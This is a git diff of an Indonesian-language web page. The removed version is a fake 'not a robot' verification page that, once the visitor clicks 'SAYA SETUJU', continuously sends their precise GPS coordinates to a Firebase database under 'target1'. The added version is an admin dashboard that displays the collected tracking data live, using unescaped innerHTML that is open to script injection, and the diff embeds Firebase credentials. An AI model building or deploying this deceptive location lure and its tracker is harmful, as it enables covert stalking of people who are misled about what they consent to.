@@ -3,22 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi</title>
+    <title>Admin Live Tracker</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 </head>
-<body class="bg-gray-900 text-white flex items-center justify-center h-screen">
-    <div class="bg-gray-800 p-8 rounded-2xl shadow-2xl max-w-sm text-center border border-gray-700">
-        <h2 class="text-2xl font-bold mb-4">Konfirmasi Akses</h2>
-        <p class="text-gray-400 mb-6">Harap izinkan akses lokasi untuk memverifikasi bahwa Anda bukan robot.</p>
-        <button onclick="mulaiLacak()" class="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-full font-bold transition-all w-full shadow-lg">
-            SAYA SETUJU
-        </button>
-        <p id="status" class="mt-4 text-xs text-gray-500 italic"></p>
+<body class="bg-gray-100 font-sans">
+
+    <nav class="bg-blue-600 p-4 text-white shadow-lg">
+        <div class="container mx-auto flex justify-between items-center">
+            <h1 class="text-xl font-bold">Admin Dashboard Tracker</h1>
+            <span id="status" class="text-sm bg-blue-700 px-3 py-1 rounded">Connecting...</span>
+        </div>
+    </nav>
+
+    <div class="container mx-auto p-6">
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+            <div class="bg-white p-6 rounded-lg shadow-md border-l-4 border-blue-500">
+                <h3 class="text-gray-500 text-sm font-medium uppercase">Total Update</h3>
+                <p id="total-count" class="text-3xl font-bold">0</p>
+            </div>
+        </div>
+
+        <div class="bg-white shadow-md rounded-lg overflow-hidden">
+            <table class="min-w-full leading-normal">
+                <thead>
+                    <tr class="bg-gray-200 text-gray-600 uppercase text-sm leading-normal">
+                        <th class="py-3 px-6 text-left">Waktu</th>
+                        <th class="py-3 px-6 text-left">Nama/ID</th>
+                        <th class="py-3 px-6 text-center">Status/Lokasi</th>
+                    </tr>
+                </thead>
+                <tbody id="data-table-body" class="text-gray-600 text-sm font-light">
+                    </tbody>
+            </table>
+        </div>
     </div>
 
-    <script>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        // Konfigurasi Firebase Anda
         const firebaseConfig = {
             apiKey: "AIzaSyAQW4WSw-O2JYDnZfBciUPTVzm07rcsyXs",
             authDomain: "live-traker-e7ce2.firebaseapp.com",
@@ -26,39 +50,57 @@
             storageBucket: "live-traker-e7ce2.firebasestorage.app",
             messagingSenderId: "425874298746",
             appId: "1:425874298746:web:949db14ea30a1e742068c3",
-            measurementId: "G-7PD74XWDSN",
-            databaseURL: "https://live-traker-e7ce2-default-rtdb.firebaseio.com"
+            measurementId: "G-7PD74XWDSN"
         };
 
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const statusEl = document.getElementById('status');
+        const tableBody = document.getElementById('data-table-body');
+        const countEl = document.getElementById('total-count');
 
-        function mulaiLacak() {
-            const status = document.getElementById('status');
-            if (!navigator.geolocation) {
-                status.innerText = "Browser tidak mendukung GPS.";
-                return;
-            }
-            status.innerText = "Memverifikasi...";
+        // Referensi Path Database (Ubah 'tracking_data' sesuai struktur DB Anda)
+        const dataRef = ref(db, 'tracking_data');
 
-            navigator.geolocation.watchPosition((position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
+        // Mengambil data secara Realtime
+        onValue(dataRef, (snapshot) => {
+            const data = snapshot.val();
+            tableBody.innerHTML = ''; // Kosongkan tabel sebelum update
+            
+            if (data) {
+                statusEl.innerText = "Connected";
+                statusEl.className = "text-sm bg-green-500 px-3 py-1 rounded";
                 
-                // Simpan ke Firebase Realtime Database
-                database.ref('live_location/target1').set({
-                    latitude: lat,
-                    longitude: lon,
-                    accuracy: position.coords.accuracy,
-                    timestamp: Date.now()
+                let count = 0;
+                Object.keys(data).forEach(key => {
+                    const item = data[key];
+                    const row = `
+                        <tr class="border-b border-gray-200 hover:bg-gray-100">
+                            <td class="py-3 px-6 text-left">${item.timestamp || '-'}</td>
+                            <td class="py-3 px-6 text-left font-medium">${item.name || key}</td>
+                            <td class="py-3 px-6 text-center">
+                                <span class="bg-green-200 text-green-700 py-1 px-3 rounded-full text-xs">
+                                    ${item.location || 'Active'}
+                                </span>
+                            </td>
+                        </tr>
+                    `;
+                    tableBody.innerHTML += row;
+                    count++;
                 });
-
-                status.innerText = "Verifikasi Berhasil!";
-            }, (error) => {
-                status.innerText = "Akses Lokasi Ditolak.";
-            }, { enableHighAccuracy: true });
-        }
+                countEl.innerText = count;
+            } else {
+                tableBody.innerHTML = '<tr><td colspan="3" class="p-4 text-center">Tidak ada data.</td></tr>';
+                statusEl.innerText = "No Data";
+            }
+        }, (error) => {
+            console.error(error);
+            statusEl.innerText = "Error Connection";
+            statusEl.className = "text-sm bg-red-500 px-3 py-1 rounded";
+        });
     </script>
 </body>
 </html>
+
 
